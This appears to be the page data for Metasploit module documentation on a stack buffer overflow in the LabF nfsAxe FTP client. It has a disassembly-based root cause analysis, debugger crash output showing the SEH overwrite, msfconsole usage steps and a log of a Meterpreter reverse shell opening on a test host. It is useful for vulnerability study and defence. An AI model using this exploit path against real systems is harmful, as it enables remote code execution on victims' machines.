{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/ftp/labf_nfsaxe","result":{"data":{"moduleMetadataJson":{"id":"cf3590d6-1c99-5853-98d4-f25fb51fa100","name":"LabF nfsAxe 3.7 FTP Client Stack Buffer Overflow","fullname":"exploit/windows/ftp/labf_nfsaxe","description":"This module exploits a buffer overflow in the LabF nfsAxe 3.7 FTP Client allowing remote\n          code execution.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/windows/ftp/labf_nfsaxe","documentationSlug":"/modules/documentation/exploit/windows/ftp/labf_nfsaxe","referencesSlug":"/modules/references/exploit/windows/ftp/labf_nfsaxe"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>LabF nfsAxe is a package of NFS servers and clients on Windows, including:</p>\n<ul>\n<li>NFS Client</li>\n<li>NFS Server</li>\n<li>FTP client</li>\n<li>Telnet</li>\n<li>LPD &#x26; LPR</li>\n<li>TFTP</li>\n</ul>\n<p>The FTP client is vulnerable a stack-based buffer overflow due to the way it handles the server\ninput, which could lead to arbitrary remote code execution under the context of the user.</p>\n<p>The exploit was tested on Windows 7 Enterprise SP1 (English).</p>\n<p>The vulnerable copy can be <a href=\"https://www.exploit-db.com/apps/81575f3c81f28a239e881f68e5ea82b1-nfsaxe.exe\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">downloaded from Exploit-DB</a>.</p>\n<h3 id=\"root-cause-analysis\" style=\"position:relative;\"><a href=\"#root-cause-analysis\" aria-label=\"root cause analysis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Root Cause Analysis</h3>\n<p>Inside sub<em>42C890() of ftp.exe, a stack buffer <code class=\"language-text\">[esp+2424h+ptrBuffer]</code> is passed as an\nargument to sub</em>42EE10():</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">AUTO:0042C8FF loc_42C8FF:                             ; CODE XREF: sub_42C890+16A\u0019j\nAUTO:0042C8FF                                         ; sub_42C890+1B5\u0019j\nAUTO:0042C8FF                 push    edi\nAUTO:0042C900                 mov     ebx, 3FFh\nAUTO:0042C905                 lea     edx, [esp+2424h+ptrBuffer]\nAUTO:0042C90C                 push    1\nAUTO:0042C90E                 mov     eax, ds:dword_465100\nAUTO:0042C913                 mov     ecx, edi\nAUTO:0042C915                 call    sub_42EE10      ; Call Procedure</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>According to IDA, the buffer size is 1024 bytes:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">-0000041C ptrBuffer       db 1024 dup(?)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>The buffer pointer is used to receive data from the FTP server. It is passed all the way to\nxwpwsock!recv<em>dll, and then WS2</em>32!recv. Finally, the exploit causes the exploit to crash\nbecause the malicious string is long enough that causes an out-of-bound WRITE. This can\nbe observed by the following demonstration with these breakpoints:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">bp 0042c915 &quot;.printf \\&quot;Passing static buffer pointer at 0x%08x\\&quot;, edx; .echo ;g&quot;\nbp 0042ea0c &quot;.printf \\&quot;Destination buffer for receive is: 0x%08x\\n\\&quot;, edx; .echo; g&quot;\nbp 0042eb73 &quot;.printf \\&quot;EDX Text dump: %ma\\n\\&quot;, edx; .echo; .echo; g&quot;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>The WinDBG output:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Passing static buffer pointer at 0x027ff4f4\nDestination buffer for receive is: 0x027ff4f4 \nEDX Text dump: AAAAAAAAAAAAAAA ........ AAAAAAAAAAAAAAA (a very long string)\n\n(d48.864): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000041 ebx=000003fe ecx=ffffdbfc edx=000003fe esi=027ffc02 edi=02800000\neip=0042cac5 esp=027fd4ec ebp=000023ee iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nftp+0x2cac5:\n0042cac5 8807            mov     byte ptr [edi],al          ds:0023:02800000=??</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>In this crash, ESI is the source input, which is filled with our malicious input:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">0:001&gt; dd esi\n027ffc02  41414141 41414141 41414141 41414141\n027ffc12  41414141 41414141 41414141 41414141\n027ffc22  41414141 41414141 41414141 41414141\n027ffc32  41414141 41414141 41414141 41414141\n027ffc42  41414141 41414141 41414141 41414141\n027ffc52  41414141 41414141 41414141 41414141\n027ffc62  41414141 41414141 41414141 41414141\n027ffc72  41414141 41414141 41414141 41414141</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>EDI would be the destination buffer used for this copy routine:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">AUTO:0042CAC3 loc_42CAC3:                             ; CODE XREF: sub_42C890+249\u0019j\nAUTO:0042CAC3                 mov     al, [esi]       ; ESI is the malicious input\nAUTO:0042CAC5                 mov     [edi], al       ; EDI = our buffer, and AL is a byte from the malicious input\nAUTO:0042CAC7                 cmp     al, 0           ; Check null byte\nAUTO:0042CAC9                 jz      short loc_42CADB ; Done copying\nAUTO:0042CACB                 mov     al, [esi+1]     ; The next byte\nAUTO:0042CACE                 add     esi, 2\nAUTO:0042CAD1                 mov     [edi+1], al\nAUTO:0042CAD4                 add     edi, 2\nAUTO:0042CAD7                 cmp     al, 0\nAUTO:0042CAD9                 jnz     short loc_42CAC3 ; Continue copying if string isn&#39;t null</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Since the exploit supplies a string that is long enough, the SEH chain on the stack is also\noverwritten:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">0:001&gt; !exchain\n027fff70: 41414141\nInvalid exception stack at 41414141</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>The exploit simply overwrites the SEH chain to gain arbitrary code execution.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>To test the exploit:</p>\n<ol>\n<li>Install the application</li>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do: <code class=\"language-text\">use exploit/windows/ftp/labf_nfsaxe</code></li>\n<li>Set options and payload</li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>Connect to the FTP server using the FTP client</li>\n<li>You should get a session like the following demonstration:</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(windows/ftp/labf_nfsaxe) &gt; run\n\n[*] Started reverse TCP handler on 172.16.85.1:4444 \n[*] Please ask your target(s) to connect to 172.16.85.1:21\n[*] Server started.\nmsf exploit(windows/ftp/labf_nfsaxe) &gt;\n[*] 172.16.85.134 - connected.\n[*] 172.16.85.134 - Response: Sending 220 Welcome\n[*] 172.16.85.134 - Request: AUTH GSSAPI\n[*] 172.16.85.134 - Response: sending 331 OK\n[*] 172.16.85.134 - Request: ADAT TlRMTVNTUA==\n[*] 172.16.85.134 - Response: Sending 230 OK\n[*] 172.16.85.134 - Request: USER Guest\n[*] 172.16.85.134 - Request: Sending the malicious response\n[*] Sending stage (179779 bytes) to 172.16.85.134\n[*] Meterpreter session 1 opened (172.16.85.1:4444 -&gt; 172.16.85.134:49213) at 2018-01-09 22:38:33 -0600</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"cf3590d6-1c99-5853-98d4-f25fb51fa100"}}}